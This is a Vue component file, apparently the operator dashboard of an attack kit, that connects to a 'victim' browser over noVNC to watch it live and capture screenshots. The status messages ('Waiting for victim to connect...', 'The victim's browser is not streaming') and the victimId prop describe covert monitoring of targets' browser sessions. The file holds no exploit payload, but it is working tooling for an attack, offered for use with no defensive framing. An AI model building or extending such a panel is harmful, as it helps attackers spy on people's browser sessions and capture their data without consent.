<script setup>
import { ref, computed, watch, onMounted, onBeforeUnmount, nextTick } from 'vue'
import { useToast } from 'primevue/usetoast'
import Select from 'primevue/select'
import RFB from 'novnc-core'

const props = defineProps({
    streamUrl: {
        type: String,
        default: null
    },
    victimId: {
        type: String,
        required: true
    },
    isLive: {
        type: Boolean,
        default: false
    },
    capturePending: {
        type: Boolean,
        default: false
    }
})

const emit = defineEmits(['capture-requested'])

const toast = useToast()

// Refs
const container = ref(null)
const rfbInstance = ref(null)
const isFullscreen = ref(false)
const isConnected = ref(false)
const isConnecting = ref(false)
const showControls = ref(true)
const viewQuality = ref('high')
const compressionLevel = ref(2)

const compressionOptions = [
    { label: 'No Compression', value: 0 },
    { label: 'Low', value: 2 },
    { label: 'Medium', value: 6 },
    { label: 'High', value: 9 }
]

// Computed
const isStreaming = computed(() => !!props.streamUrl && props.isLive)

const statusText = computed(() => {
    if (isConnecting.value) return 'Connecting...'
    if (isConnected.value) return 'Live'
    if (!props.streamUrl) return 'No Stream URL'
    if (!props.isLive) return 'Offline'
    return 'Disconnected'
})

const statusClass = computed(() => {
    if (isConnecting.value) return 'connecting'
    if (isConnected.value) return 'streaming'
    return 'offline'
})

// VNC Methods
const initializeRFB = async (url) => {
    if (!container.value || !url) return

    try {
        isConnecting.value = true

        // Create RFB instance
        const rfb = new RFB(container.value, url, {
            shared: true,
            credentials: { password: '' }
        })

        // Set options
        rfb.viewOnly = true
        rfb.clipViewport = false
        rfb.scaleViewport = true
        rfb.resizeSession = false
        rfb.showDotCursor = true
        rfb.qualityLevel = getQualityLevel()
        rfb.compressionLevel = compressionLevel.value

        // Event handlers
        rfb.addEventListener('connect', handleConnect)
        rfb.addEventListener('disconnect', handleDisconnect)
        rfb.addEventListener('securityfailure', handleSecurityFailure)

        rfbInstance.value = rfb
    } catch (error) {
        console.error('❌ Failed to initialize RFB:', error)
        isConnecting.value = false

        toast.add({
            severity: 'error',
            summary: 'Connection Failed',
            detail: error.message || 'Could not connect to VNC stream',
            life: 5000
        })
    }
}

const destroyRFB = () => {
    if (rfbInstance.value) {

        rfbInstance.value.removeEventListener('connect', handleConnect)
        rfbInstance.value.removeEventListener('disconnect', handleDisconnect)
        rfbInstance.value.removeEventListener('securityfailure', handleSecurityFailure)

        rfbInstance.value.disconnect()
        rfbInstance.value = null
    }

    isConnected.value = false
    isConnecting.value = false
}

const reconnect = () => {
    destroyRFB()

    toast.add({
        severity: 'info',
        summary: 'Reconnecting',
        detail: 'Attempting to reconnect to stream...',
        life: 2000
    })

    nextTick(() => {
        if (props.streamUrl) {
            initializeRFB(props.streamUrl)
        }
    })
}

// Event Handlers
const handleConnect = () => {
    isConnected.value = true
    isConnecting.value = false

    toast.add({
        severity: 'success',
        summary: 'Connected',
        detail: 'Stream connected successfully',
        life: 3000
    })
}

const handleDisconnect = (e) => {
    isConnected.value = false
    isConnecting.value = false

    if (e.detail.clean) {
        toast.add({
            severity: 'info',
            summary: 'Disconnected',
            detail: 'Stream disconnected',
            life: 3000
        })
    } else {
        toast.add({
            severity: 'warn',
            summary: 'Connection Lost',
            detail: 'Stream connection was interrupted',
            life: 5000
        })
    }
}

const handleSecurityFailure = (e) => {
    console.error('❌ VNC Security Failure:', e.detail)
    isConnecting.value = false

    toast.add({
        severity: 'error',
        summary: 'Authentication Failed',
        detail: e.detail.reason || 'Security authentication failed',
        life: 5000
    })
}

// Quality Control
const getQualityLevel = () => {
    const levels = {
        high: 9,
        medium: 6,
        low: 2
    }
    return levels[viewQuality.value] || 6
}

const applyQualitySettings = () => {
    if (!rfbInstance.value) return

    rfbInstance.value.qualityLevel = getQualityLevel()
    rfbInstance.value.compressionLevel = compressionLevel.value

    toast.add({
        severity: 'info',
        summary: 'Quality Updated',
        detail: `Quality: ${viewQuality.value}, Compression: ${compressionLevel.value}`,
        life: 2000
    })
}

const captureScreenshot = () => {
    if (isConnected.value && !props.capturePending) {
        emit('capture-requested')
    }
}

// Fullscreen
const toggleFullscreen = async () => {
    if (!container.value) return

    try {
        if (!document.fullscreenElement) {
            await container.value.requestFullscreen()
            isFullscreen.value = true
            showControls.value = false

            toast.add({
                severity: 'info',
                summary: 'Fullscreen Mode',
                detail: 'Press ESC to exit',
                life: 2000
            })
        } else {
            await document.exitFullscreen()
            isFullscreen.value = false
            showControls.value = true
        }
    } catch (error) {
        console.error('Fullscreen error:', error)
        toast.add({
            severity: 'error',
            summary: 'Fullscreen Error',
            detail: 'Could not enter fullscreen mode',
            life: 3000
        })
    }
}

const handleFullscreenChange = () => {
    isFullscreen.value = !!document.fullscreenElement
    showControls.value = !isFullscreen.value
}

// Copy Stream URL
const copyStreamUrl = () => {
    if (props.streamUrl) {
        navigator.clipboard.writeText(props.streamUrl)

        toast.add({
            severity: 'success',
            summary: 'Copied',
            detail: 'Stream URL copied to clipboard',
            life: 2000
        })
    }
}

// Watchers
watch(() => props.streamUrl, (newUrl, oldUrl) => {
    if (newUrl !== oldUrl) {
        destroyRFB()
        if (newUrl && props.isLive) {
            nextTick(() => {
                initializeRFB(newUrl)
            })
        }
    }
})

watch(() => props.isLive, (newIsLive) => {
    if (newIsLive && props.streamUrl && !rfbInstance.value) {
        nextTick(() => {
            initializeRFB(props.streamUrl)
        })
    } else if (!newIsLive) {
        destroyRFB()
    }
})

watch([viewQuality, compressionLevel], () => {
    applyQualitySettings()
})

// Lifecycle
onMounted(() => {
    nextTick(() => {
        if (props.streamUrl && props.isLive) {
            initializeRFB(props.streamUrl)
        }
    })

    document.addEventListener('fullscreenchange', handleFullscreenChange)
})

onBeforeUnmount(() => {
    destroyRFB()
    document.removeEventListener('fullscreenchange', handleFullscreenChange)

    if (document.fullscreenElement) {
        document.exitFullscreen()
    }
})
</script>

<template>
    <Card class="stream-card">
        <template #title>
            <div class="stream-header">
                <div class="header-left">
                    <span class="status-badge" :class="statusClass">
                        <i class="pi pi-circle-fill"></i>
                        {{ statusText }}
                    </span>
                </div>

                <div v-if="showControls" class="header-actions">

                    <Select
                        v-model="compressionLevel"
                        :options="compressionOptions"
                        optionLabel="label"
                        optionValue="value"
                        size="small"
                        placeholder="Compression"
                        :disabled="!isConnected"
                    />

                    <Button
                        icon="pi pi-camera"
                        :loading="capturePending"
                        size="small"
                        text
                        rounded
                        @click="captureScreenshot"
                        v-tooltip.bottom="'Capture Screenshot (S)'"
                        :disabled="!isConnected"
                    />

                    <Button
                        icon="pi pi-refresh"
                        size="small"
                        text
                        rounded
                        @click="reconnect"
                        v-tooltip.bottom="'Reconnect (R)'"
                        :disabled="!props.streamUrl"
                    />

                    <Button
                        icon="pi pi-clone"
                        size="small"
                        text
                        rounded
                        @click="copyStreamUrl"
                        v-tooltip.bottom="'Copy Stream URL'"
                        :disabled="!props.streamUrl"
                    />

                    <Button
                        :icon="isFullscreen ? 'pi pi-window-minimize' : 'pi pi-window-maximize'"
                        size="small"
                        text
                        rounded
                        @click="toggleFullscreen"
                        v-tooltip.bottom="'Toggle Fullscreen (F)'"
                        :disabled="!isConnected"
                    />
                </div>
            </div>
        </template>

        <template #content>
            <div
                ref="container"
                class="stream-container"
                :class="{
                    fullscreen: isFullscreen,
                    'no-stream': !isStreaming,
                    connecting: isConnecting
                }"
            >
                <!-- VNC Canvas will be injected here -->

                <!-- No stream state -->
                <div v-if="!isStreaming && !isConnecting" class="no-stream-state">
                    <i class="pi pi-desktop"></i>
                    <p>{{ props.streamUrl ? 'Stream Offline' : 'No Stream Available' }}</p>
                    <small v-if="!props.streamUrl">Waiting for victim to connect...</small>
                    <small v-else>The victim's browser is not streaming</small>
                </div>

                <!-- Connecting state -->
                <div v-if="isConnecting" class="connecting-state">
                    <i class="pi pi-spin pi-spinner"></i>
                    <p>Connecting to stream...</p>
                </div>

                <!-- Fullscreen overlay controls -->
                <div v-if="isFullscreen" class="fullscreen-controls">
                    <div class="controls-overlay">
                        <Button
                            icon="pi pi-camera"
                            :loading="capturePending"
                            text
                            rounded
                            size="large"
                            @click="captureScreenshot"
                            v-tooltip.top="'Screenshot (S)'"
                        />

                        <Button
                            icon="pi pi-refresh"
                            text
                            rounded
                            size="large"
                            @click="reconnect"
                            v-tooltip.top="'Reconnect (R)'"
                        />

                        <Button
                            icon="pi pi-times"
                            text
                            rounded
                            size="large"
                            @click="toggleFullscreen"
                            v-tooltip.top="'Exit (ESC)'"
                        />
                    </div>
                </div>

                <!-- Stream info overlay -->
                <div v-if="isConnected && !isFullscreen" class="stream-info">
                    <span class="info-item">
                        <i class="pi pi-clock"></i>
                        {{ new Date().toLocaleTimeString() }}
                    </span>
                    <span class="info-item">
                        <i class="pi pi-desktop"></i>
                        {{ viewQuality }} / C{{ compressionLevel }}
                    </span>
                </div>
            </div>
        </template>
    </Card>
</template>

<style scoped>
.stream-card {
    height: 100%;
}

.stream-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 1rem;
    flex-wrap: wrap;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 0.75rem;
}

.stream-title {
    font-size: 1rem;
    font-weight: 600;
    color: var(--color-heading);
}

.status-badge {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    font-size: 0.75rem;
    padding: 0.25rem 0.625rem;
    border-radius: 12px;
    font-weight: 500;
}

.status-badge.streaming {
    background-color: var(--danger-subtle);
    color: var(--danger);
}

.status-badge.streaming i {
    animation: pulse 2s infinite;
}

.status-badge.connecting {
    background-color: var(--warning-subtle);
    color: var(--warning);
}

.status-badge.offline {
    background-color: var(--color-background-mute);
    color: var(--color-text-mute);
}

@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

.header-actions {
    display: flex;
    gap: 0.5rem;
    align-items: center;
    flex-wrap: wrap;
}

/* Stream Container */
.stream-container {
    position: relative;
    width: 100%;
    min-height: 400px;
    height: auto;
    background-color: #000;
    border-radius: 6px;
    overflow: hidden;
    border: 1px solid var(--color-border);
}

.stream-container.fullscreen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw !important;
    height: 100vh !important;
    z-index: 9999;
    border-radius: 0;
    border: none;
}

.stream-container.no-stream,
.stream-container.connecting {
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 400px;
}

/* No stream / Connecting states */
.no-stream-state,
.connecting-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 0.75rem;
    color: rgba(255, 255, 255, 0.6);
    text-align: center;
    padding: 2rem;
}

.no-stream-state i,
.connecting-state i {
    font-size: 3rem;
    opacity: 0.5;
}

.no-stream-state p,
.connecting-state p {
    margin: 0;
    font-size: 1rem;
    font-weight: 500;
    color: rgba(255, 255, 255, 0.8);
}

.no-stream-state small {
    font-size: 0.875rem;
    opacity: 0.7;
}

/* Fullscreen controls */
.fullscreen-controls {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, transparent 100%);
    padding: 2rem 2rem 1rem 2rem;
    opacity: 0;
    transition: opacity 0.3s;
    pointer-events: none;
}

.stream-container.fullscreen:hover .fullscreen-controls {
    opacity: 1;
    pointer-events: all;
}

.controls-overlay {
    display: flex;
    justify-content: center;
    gap: 1rem;
}

.controls-overlay .p-button {
    background-color: rgba(255, 255, 255, 0.1) !important;
    color: white !important;
    backdrop-filter: blur(10px);
}

.controls-overlay .p-button:hover {
    background-color: rgba(255, 255, 255, 0.2) !important;
}

/* Stream info overlay */
.stream-info {
    position: absolute;
    top: 0.75rem;
    left: 0.75rem;
    display: flex;
    flex-direction: column;
    gap: 0.375rem;
    pointer-events: none;
    z-index: 10;
}

.info-item {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    font-size: 0.75rem;
    padding: 0.25rem 0.625rem;
    background-color: rgba(0, 0, 0, 0.6);
    color: rgba(255, 255, 255, 0.9);
    border-radius: 4px;
    backdrop-filter: blur(10px);
    width: fit-content;
}

.info-item i {
    font-size: 0.7rem;
    opacity: 0.8;
}

/* Keyboard shortcuts hint */
.shortcuts-hint {
    margin-top: 0.75rem;
    text-align: center;
    color: var(--color-text-mute);
}

.shortcuts-hint small {
    font-size: 0.75rem;
}

.shortcuts-hint kbd {
    padding: 0.125rem 0.375rem;
    background-color: var(--color-background-mute);
    border: 1px solid var(--color-border);
    border-radius: 3px;
    font-family: monospace;
    font-size: 0.7rem;
    font-weight: 600;
}

/* ESC hint in fullscreen */
.stream-container.fullscreen::after {
    content: 'Press ESC to exit fullscreen';
    position: absolute;
    top: 1rem;
    left: 50%;
    transform: translateX(-50%);
    padding: 0.5rem 1rem;
    background-color: rgba(0, 0, 0, 0.8);
    color: white;
    border-radius: 4px;
    font-size: 0.875rem;
    opacity: 0;
    animation: fadeInOut 3s ease-in-out;
    pointer-events: none;
    z-index: 10;
}

@keyframes fadeInOut {
    0%, 100% { opacity: 0; }
    10%, 90% { opacity: 1; }
}

/* Responsive */
@media (max-width: 768px) {
    .stream-container {
        min-height: 300px;
    }

    .stream-header {
        flex-direction: column;
        align-items: stretch;
    }

    .header-actions {
        justify-content: flex-end;
    }

    .fullscreen-controls {
        padding: 1rem;
    }

    .controls-overlay {
        gap: 0.5rem;
    }

    .shortcuts-hint {
        display: none;
    }
}
</style>

<style>
/* Global VNC Canvas Styling */
#vnc-container div canvas {
    cursor: default !important;
    width: 100% !important;
    height: auto !important;
    max-width: 100% !important;
    max-height: 65vh !important;
    object-fit: contain;
}

.stream-container.fullscreen div canvas {
    max-height: 100vh !important;
}
</style>
